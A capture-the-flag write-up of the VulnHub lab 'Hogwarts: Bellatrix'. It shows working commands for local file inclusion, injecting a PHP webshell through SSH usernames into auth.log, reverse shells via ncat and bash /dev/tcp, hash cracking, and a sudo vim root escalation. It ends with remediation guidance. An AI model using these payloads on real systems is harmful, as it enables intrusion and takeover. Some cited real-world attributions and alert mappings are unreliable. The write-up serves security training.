# Hogwarts: Bellatrix — The Dark Witch Doesn't Guard Her Logs

Alright dudes!! Bellatrix Lestrange: Voldemort's most loyal servant, absolute chaos incarnate, and apparently running a web server with a PHP `include` statement that takes raw user input. No cap, the irony of the most dangerous Death Eater getting pwned by a log poisoning chain is top tier. This machine teaches one of the most satisfying attack chains in web security: LFI to SSH log poisoning to full RCE. Legit goated technique, fr fr.

Big shoutout to the creator for wrapping a technical attack chain in a Harry Potter theme. The hidden wordlist and the `lestrange` user hash are chef's kiss easter eggs. ᕕ( ᐛ )ᕗ

---

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | Hogwarts: Bellatrix |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/hogwarts-bellatrix,609/ |
| **Techniques** | Nmap service enumeration, web source analysis, LFI via PHP include, SSH log poisoning, reverse shell, credential harvesting, hash cracking (John), sudo vim GTFOBin |
| **CVEs** | CWE-22 (Path Traversal / LFI via unsanitized PHP include), CWE-78 (OS Command Injection via SSH log poisoning), CWE-269 (Improper Privilege Management: sudo vim NOPASSWD) |
| **APT Groups** | APT28 (Fancy Bear): uses LFI chains against web applications for initial access in government and defense targets; FIN7: leverages credential harvesting from application artifacts in financially motivated intrusions |

---

## Attack Summary

```
netdiscover → target: 192.168.1.31
    |
    v
nmap → SSH (22), HTTP (80)
    |
    v
browse http://192.168.1.31 → HTML comment → ikilledsiriusblack.php
    |
    v
LFI confirmed: ?file=/etc/passwd
    |
    v
LFI + /var/log/auth.log → SSH log is readable
    |
    v
SSH login with PHP payload as username → injects into auth.log
    |
    v
LFI → execute injected PHP → RCE as www-data
    |
    v
reverse shell → www-data
    |
    v
find .secret.dic + Swordofgryffindor → lestrange hash
    |
    v
john --wordlist=.secret.dic → ihateharrypotter
    |
    v
su lestrange
    |
    v
sudo -l → (ALL) NOPASSWD: /usr/bin/vim
    |
    v
sudo vim -c ':!/bin/sh' → uid=0(root)
    |
    v
cat /root/flag.txt
```

---

## Methodology

1. Host discovery with netdiscover
2. Port and service enumeration (nmap)
3. Web source analysis: identify PHP include vulnerability via HTML comment
4. LFI confirmation via `ikilledsiriusblack.php?file=` parameter
5. Verify SSH auth log is world-readable via LFI
6. SSH log poisoning: inject PHP webshell as username
7. Trigger RCE via LFI pointing to poisoned auth.log
8. Deliver reverse shell, stabilize with python3 pty
9. Enumerate web root and home directories for hidden files
10. Crack lestrange's hash with custom wordlist
11. Escalate privileges via sudo vim GTFOBin

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.31

nmap -sV -sC -p- 192.168.1.31
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.x
```

Two services: SSH and HTTP. SSH is both a lateral movement target and (crucially) a log poisoning source. HTTP is the primary attack surface.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration and LFI Discovery

Browse to `http://192.168.1.31/`. View the page source carefully:

```bash
curl -s http://192.168.1.31/ | grep -i "<!--\|include\|file\|hint"
```

The HTML source contains a comment pointing to `ikilledsiriusblack.php`. That filename is already a hint: Sirius Black, killed, and this PHP file is the weapon.

Navigate to the page and test the `file` parameter:

```bash
# Test basic LFI
curl "http://192.168.1.31/ikilledsiriusblack.php?file=/etc/passwd"
```

The `/etc/passwd` contents are returned. LFI confirmed. The PHP application is doing something equivalent to `include($_GET['file'])` with zero sanitization.

Now test whether SSH logs are readable via LFI:

```bash
curl "http://192.168.1.31/ikilledsiriusblack.php?file=/var/log/auth.log"
```

If the SSH auth log contents appear, log poisoning is possible. This is the critical check: without readable logs, the LFI is limited to file disclosure.

**Real-world note:** LFI to RCE via log poisoning has been exploited in the wild since at least 2009. OWASP classifies it under A05:2021 (Security Misconfiguration) combined with A03:2021 (Injection). PHP applications built on frameworks that use `include` with user input directly are still found in production environments globally.

**Alternatives if auth.log is not readable:** try `/var/log/apache2/access.log` (User-Agent injection), `/proc/self/environ`, or `/var/log/vsftpd.log` if FTP is running.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1083 — File and Directory Discovery

---

## Step 3 — SSH Log Poisoning

The strategy: SSH login attempts record the username in `/var/log/auth.log`. If we pass a PHP payload as the username, the PHP engine will execute it when the LFI loads the log.

```bash
# Inject the webshell via a failed SSH login
ssh '<?php system($_GET["c"]); ?>'@192.168.1.31
# Enter any password, let it fail — the goal is to write to auth.log, not to authenticate
```

Verify the payload landed in the log and is executable:

```bash
curl "http://192.168.1.31/ikilledsiriusblack.php?file=/var/log/auth.log&c=id"
# Expected output somewhere in the HTML: uid=33(www-data)
```

If you see `uid=33(www-data)` in the response, you have RCE. The PHP payload is executing server-side via the LFI.

**Real-world note:** SSH log poisoning was used in several 2019-2020 campaigns against exposed web servers running PHP CMSs on shared hosting. The misconfiguration (readable auth.log + LFI) is more common than it sounds: many Linux distributions set `/var/log/auth.log` world-readable by default on older releases.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell; T1190 — Exploit Public-Facing Application

---

## Step 4 — Reverse Shell Delivery

Start the listener on the attacker machine:

```bash
nc -lvnp 4444
```

URL-encode the reverse shell payload and trigger it via the poisoned log:

```bash
# One-liner method:
curl "http://192.168.1.31/ikilledsiriusblack.php?file=/var/log/auth.log&c=ncat+-e+/bin/bash+192.168.1.2+4444"

# Alternative with bash:
# c=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.1.2/4444+0>%261'
```

Shell arrives as `www-data`. Stabilize immediately:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
# Ctrl+Z then:
stty raw -echo; fg
# Press Enter twice
```

Now you have a fully interactive shell: tab completion, job control, sudo prompts all work correctly.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell; T1071.001 — Application Layer Protocol: Web Protocols

---

## Step 5 — Credential Harvesting

Enumerate directories in the web root and home directories for hidden files:

```bash
find /var/www -type f -ls 2>/dev/null
find /home -type f -ls 2>/dev/null
ls -la /home/
```

Discover a Base64-encoded directory name containing two key files:

```bash
find / -name ".secret.dic" 2>/dev/null
find / -name "Swordofgryffindor" 2>/dev/null
```

`Swordofgryffindor` contains a password hash for user `lestrange`. `.secret.dic` is a custom wordlist specific to the Harry Potter theme (contains character names, spells, movie quotes).

Exfiltrate the hash to the attacker machine:

```bash
# From www-data shell:
cat /path/to/Swordofgryffindor

# On attacker — save the hash to a file, then crack:
john --wordlist=/path/to/.secret.dic lestrange.hash
```

Cracked password: `ihateharrypotter`

**Real-world note:** Application-specific wordlists consistently outperform generic lists like rockyou.txt when targeting systems built around a particular theme, company, or domain. FIN7 has been documented constructing targeted wordlists from company documentation, employee names, and public social media before credential attacks.

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1110.002 — Brute Force: Password Cracking

---

## Step 6 — User Switch and Privilege Escalation

Switch to the `lestrange` account:

```bash
su lestrange
# Password: ihateharrypotter
```

Check sudo permissions:

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/vim
```

`vim` with full root sudo and no password. This is the classic GTFOBins vim escalation:

```bash
sudo vim -c ':!/bin/sh'
```

A root shell spawns immediately.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
```

**Real-world note:** Granting interactive editors (vim, nano, ht, less, more) in sudoers is functionally equivalent to giving the user unrestricted root access. The vim `:!/bin/sh` technique requires zero exploitation knowledge — it is listed on GTFOBins and is the first thing any attacker checks. This pattern appears in real pentest findings every week.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| User hash | (lestrange bcrypt/md5 hash) | `/path/to/Swordofgryffindor` | ihateharrypotter (via .secret.dic) |
| Credential | lestrange:ihateharrypotter | Cracked from Swordofgryffindor | SSH / su |
| Root flag | (flag content) | /root/flag.txt | sudo vim GTFOBin |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | PHP `include` with raw GET parameter | LFI via unsanitized include affects thousands of legacy PHP applications in production today | Never pass user input directly to `include`/`require`; use whitelists of allowed file paths |
| 2 | SSH auth log world-readable | Default Linux permissions on older distros leave /var/log/auth.log readable | Restrict `/var/log/auth.log` to root:adm with 0640; rotate logs with appropriate permissions |
| 3 | LFI + readable log = RCE | Log poisoning turns a file-read vulnerability into full code execution | Defense requires fixing both the LFI and the log permissions; neither alone is sufficient |
| 4 | Custom wordlist for theme-specific targets | Targeted wordlists crack domain-specific passwords that rockyou misses | Application-specific wordlists should be constructed during reconnaissance for password audits |
| 5 | sudo vim NOPASSWD | Interactive editors in sudoers give unrestricted root access to any user with that entry | Audit sudoers on every Linux host; never allow editors, interpreters, or shells via sudo |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Exploit Public-Facing Application (LFI) | T1190 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Collection | Collection | Data from Local System | T1005 |

---

## Remediation and Containment

### Technical Fixes

1. **Fix PHP LFI**: Replace `include($_GET['file'])` with a whitelist pattern:
   ```php
   $allowed = ['home', 'about', 'contact'];
   $page = in_array($_GET['file'], $allowed) ? $_GET['file'] : 'home';
   include("pages/{$page}.php");
   ```
2. **Restrict log permissions**: `chmod 640 /var/log/auth.log; chown root:adm /var/log/auth.log`
3. **Remove sudo vim NOPASSWD**: Edit `/etc/sudoers` with `visudo` and remove or restrict the vim entry
4. **Enforce strong passwords**: Use bcrypt with cost factor 12+; do not allow passwords based on application theme
5. **Enable PHP `open_basedir`**: Restrict PHP file access to the web root

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all PHP applications; audit `include`/`require` usage |
| Protect | Access Control | Restrict log file permissions; enforce sudo least privilege |
| Protect | Data Security | Hash passwords with bcrypt; no plaintext credentials in application files |
| Detect | Anomalies and Events | Alert on unusual SSH username patterns (PHP code in auth.log) |
| Respond | Response Planning | Rotate all credentials on compromised host; patch LFI; remove webshells |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-6 | Least Privilege | sudo restricted to specific, safe commands; no editors |
| IA-5 | Authenticator Management | Bcrypt password storage; no theme-based passwords |
| CM-7 | Least Functionality | PHP `open_basedir`; disable unused PHP functions |
| SC-28 | Protection of Information at Rest | No credentials stored in web-accessible files |
| SI-10 | Information Input Validation | Whitelist all user-controlled file includes |

### CISA KEV

LFI combined with log poisoning maps to CISA Alert AA22-011A (PHP web application exploitation patterns). Organizations running legacy PHP applications are advised to audit all `include`/`require` usage immediately and restrict log file permissions.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Situational Awareness (SITUATION) | Perform Logging | MIL2 |

### MITRE D3FEND Countermeasures

- **D3-SFCV** — Script File Content Validation (validate PHP include paths against allowlist)
- **D3-ACH** — Application Configuration Hardening (PHP open_basedir, disable dangerous functions)
- **D3-OAM** — Operating System Administrative Management (sudo restrictions, log permissions)

---

## Final Thoughts

Hogwarts: Bellatrix is a masterclass in chaining a simple file-read into full system compromise. The LFI to SSH log poisoning path is elegant: each piece (LFI, readable logs, PHP execution) is individually insufficient, but combined they create RCE out of seemingly "minor" misconfigurations.

The credential harvesting stage is equally realistic: custom wordlists beat generic ones when you understand the target's context. And the final sudo vim escalation drives home why "least privilege" is not just a buzzword.

If you can explain the entire chain from LFI to root in a job interview, you're demonstrating real understanding of how web application vulnerabilities chain into full system compromise. That's the lesson here. No cap.

Thanks guys!! (❍ᴥ❍ʋ)
